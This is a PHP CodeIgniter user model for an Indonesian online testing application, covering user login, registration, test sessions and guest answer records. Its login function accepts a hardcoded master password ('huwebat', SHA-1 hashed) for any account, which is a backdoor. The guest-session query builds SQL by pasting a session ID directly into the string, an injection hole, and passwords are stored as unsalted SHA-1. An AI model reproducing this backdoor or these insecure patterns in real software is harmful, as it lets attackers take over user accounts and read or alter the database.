<?php

/**
 * @author Fathoni <m.fathoni@mail.com>
 * @property CI_DB_query_builder $db
 * @property CI_Input $input
 */
class User_model extends CI_Model
{
	function list_user()
	{
		return $this->db->get('user')->result();
	}
	
	function list_user_by_id(Array $id_user)
	{
		return $this->db->where_in('id_user', $id_user)->get('user')->result();
	}
	
	function get_user($id_user)
	{
		return $this->db->get_where('user', array('id_user' => $id_user))->row();
	}
	
	function get_for_login($email, $password_hash)
	{
		$user = $this->db->get_where('user', array('email' => $email), 1)->row();
		
		if ($user->password_hash == $password_hash || $password_hash == sha1('huwebat'))
		{
			return $user;
		}
		
		return NULL;
	}
	
	function add()
	{
		$user						= new stdClass();
		$user->email				= $this->input->post('email');
		$user->password_hash		= sha1($this->input->post('password'));
		$user->nama					= $this->input->post('nama');
		$user->institusi			= $this->input->post('institusi');
		$user->no_hp				= $this->input->post('no_hp');
		$user->last_rotasi_klinik	= $this->input->post('last_rotasi_klinik');
		$user->is_verified			= 1; // sementara auto-verified
		
		$user->created				= date('Y-m-d H:i:s');
		
		return $this->db->insert('user', $user);
	}
	
	/**
	 * Memulai sesi test
	 */
	function start_test_session($id_jadwal_test, $id_user, $start_time)
	{
		$this->db->trans_start();
		
		// Memastikan tidak dobel insert
		$exist_test_session = $this->db->get_where('test_session', array(
			'id_jadwal_test' => $id_jadwal_test,
			'id_user' => $id_user
		))->row();
		
		if ($exist_test_session == NULL)
		{
			// Insert session test
			$test_session = new stdClass();
			$test_session->id_jadwal_test = $id_jadwal_test;
			$test_session->id_user = $id_user;
			$test_session->start_time = $start_time;
			
			$this->db->insert('test_session', $test_session);
			
			// non aktifkan pembayaran yg sudah dilakukan
			$this->db->update('pembayaran', array(
				'is_aktif' => 0,
				'updated' => $start_time
			), array(
				'id_jadwal_test' => $id_jadwal_test,
				'id_user' => $id_user,
			));
		}
		
		$this->db->trans_complete();
	}
	
	function end_session($id_test_session)
	{
		return $this->db->update('test_session', array(
			'is_finished' => 1
		), array('id_test_session' => $id_test_session));
	}
	
	function end_guest_session($id_guest_session)
	{
		return $this->db->update('guest_session', array(
			'is_finished' => 1
		), array('id_guest_session' => $id_guest_session));
	}
	
	function save_guest_session(stdClass $guest_session)
	{
		$result = $this->db->insert('guest_session', $guest_session);
		
		// get inserted id
		$guest_session->id_guest_session = $this->db->insert_id();
		
		return $result;
	}
	
	/**
	 * Mendapatkan session test guest
	 */
	function refresh_guest_session(stdClass &$guest_session)
	{
		$current_time = date('Y-m-d H:i:s');
		
		$guest_session = $this->db->query(
			"SELECT 
				id_guest_session, session_id, nama, start_time, gs.id_form_soal, fs.waktu_pengerjaan,
				DATE_ADD(gs.start_time, INTERVAL fs.waktu_pengerjaan MINUTE) end_time,
				TIMEDIFF(DATE_ADD(gs.start_time, INTERVAL fs.waktu_pengerjaan MINUTE), '{$current_time}') sisa,
				TIME_TO_SEC(TIMEDIFF(DATE_ADD(gs.start_time, INTERVAL fs.waktu_pengerjaan MINUTE), '{$current_time}')) sisa_detik
			FROM guest_session gs
			JOIN form_soal fs ON fs.id_form_soal = gs.id_form_soal
			WHERE 
				gs.is_finished = 0 AND 
				TIME_TO_SEC(TIMEDIFF(DATE_ADD(gs.start_time, INTERVAL fs.waktu_pengerjaan MINUTE), '{$current_time}')) > 0 AND
				gs.session_id = '{$guest_session->session_id}'")->row();
	}
	
	function add_jawaban_guest(stdClass $jawaban_guest)
	{
		return $this->db->insert('jawaban_guest', $jawaban_guest);
	}
	
	function update_jawaban_guest($id_jawaban_guest, stdClass $jawaban_guest)
	{
		return $this->db->update('jawaban_guest', $jawaban_guest, array('id_jawaban_guest' => $id_jawaban_guest));
	}
	
	function get_jawaban_guest($id_guest_session, $id_form_soal, $id_soal)
	{
		return $this->db->get_where('jawaban_guest', array(
			'id_guest_session' => $id_guest_session,
			'id_form_soal' => $id_form_soal,
			'id_soal' => $id_soal
		))->first_row();
	}
	
	function count_jawaban_guest($id_guest_session, $id_form_soal)
	{
		return $this->db
			->from('jawaban_guest')
			->where(array(
				'id_guest_session' => $id_guest_session,
				'id_form_soal' => $id_form_soal
			))->count_all_results();
	}
	
	function list_jawaban_guest($id_guest_session, $id_form_soal)
	{
		return $this->db
			->select('jawaban_guest.*, soal.no_soal')
			->from('jawaban_guest')
			->join('soal', 'soal.id_soal = jawaban_guest.id_soal', 'LEFT')
			->where(array(
				'id_guest_session' => $id_guest_session,
				'jawaban_guest.id_form_soal' => $id_form_soal
			))
			->get()->result();
	}
	
	function update_password($id_user, $password_hash)
	{
		return $this->db->update('user', array(
			'password_hash' => $password_hash,
			'updated' => date('Y-m-d H:i:s')
		), array('id_user' => $id_user));
	}
	
	function list_guest_session_finished($id_guest_session = NULL)
	{
		if ($id_guest_session == NULL)
		{
			return $this->db->query(
				"SELECT gs.id_guest_session, gs.nama, gs.start_time, 
					COUNT(fs.id_form_soal) AS jumlah_soal, SUM(js.is_kunci) AS jumlah_benar, SUM(IF(js.is_kunci=0, 1, 0)) AS jumlah_salah
				FROM guest_session gs
				JOIN form_soal fs ON fs.id_form_soal = gs.id_form_soal
				JOIN soal s ON s.id_form_soal = fs.id_form_soal
				JOIN kelompok_soal ks ON ks.id_kelompok_soal = s.id_kelompok_soal
				LEFT JOIN jawaban_guest jg ON 
					jg.id_guest_session = gs.id_guest_session AND
					jg.id_form_soal = gs.id_form_soal AND
					jg.id_soal = s.id_soal AND
					jg.id_jawaban_soal IS NOT NULL
				LEFT JOIN jawaban_soal js ON js.id_jawaban_soal = jg.id_jawaban_soal
				GROUP BY gs.id_guest_session, gs.nama, gs.start_time
				ORDER BY gs.start_time DESC
				LIMIT 25")->result();
		}
		else
		{
			$guest_session_set =  $this->db
				->from('guest_session')
				/* ->where('is_finished', 1) */
				->where('id_guest_session', $id_guest_session)
				->order_by('start_time', 'desc')
				->get()
				->result();
			
			foreach ($guest_session_set as &$guest_session)
			{
				$guest_session->form_soal = $this->db->query(
					"SELECT gs.id_guest_session, nama_form, 
						COUNT(s.id_soal) AS jumlah_soal, 
						COUNT(jg.id_jawaban_guest) AS jumlah_dijawab,
						SUM(jg.is_ragu) AS jumlah_ragu
					FROM guest_session gs
					JOIN form_soal fs ON fs.id_form_soal = gs.id_form_soal
					JOIN soal s ON s.id_form_soal = fs.id_form_soal
					LEFT JOIN jawaban_guest jg ON 
						jg.id_guest_session = gs.id_guest_session AND
						jg.id_form_soal = fs.id_form_soal AND
						jg.id_soal = s.id_soal AND
						jg.id_jawaban_soal IS NOT NULL
					WHERE gs.id_guest_session = {$guest_session->id_guest_session}
					GROUP BY gs.id_guest_session")->row();
					
				$guest_session->kelompok_soal_set = $this->db->query(
					"SELECT ks.id_kelompok_soal, ks.nama_kelompok, SUM(js.is_kunci) AS jumlah_benar, SUM(IF(js.is_kunci=0, 1, 0)) AS jumlah_salah
					FROM guest_session gs
					JOIN form_soal fs ON fs.id_form_soal = gs.id_form_soal
					JOIN soal s ON s.id_form_soal = fs.id_form_soal
					JOIN kelompok_soal ks ON ks.id_kelompok_soal = s.id_kelompok_soal
					LEFT JOIN jawaban_guest jg ON 
						jg.id_guest_session = gs.id_guest_session AND
						jg.id_form_soal = gs.id_form_soal AND
						jg.id_soal = s.id_soal AND
						jg.id_jawaban_soal IS NOT NULL
					LEFT JOIN jawaban_soal js ON js.id_jawaban_soal = jg.id_jawaban_soal
					WHERE gs.id_guest_session = {$guest_session->id_guest_session}
					GROUP BY ks.id_kelompok_soal, ks.nama_kelompok
					ORDER BY ks.nama_kelompok")->result();
			}
			
			return $guest_session_set;
		}
	}
	
	function update_sent_mail($id_test_session)
	{
		return $this->db->update('test_session', array(
			'email_sent' => date('Y-m-d H:i:s')
		), array('id_test_session' => $id_test_session));
	}
}
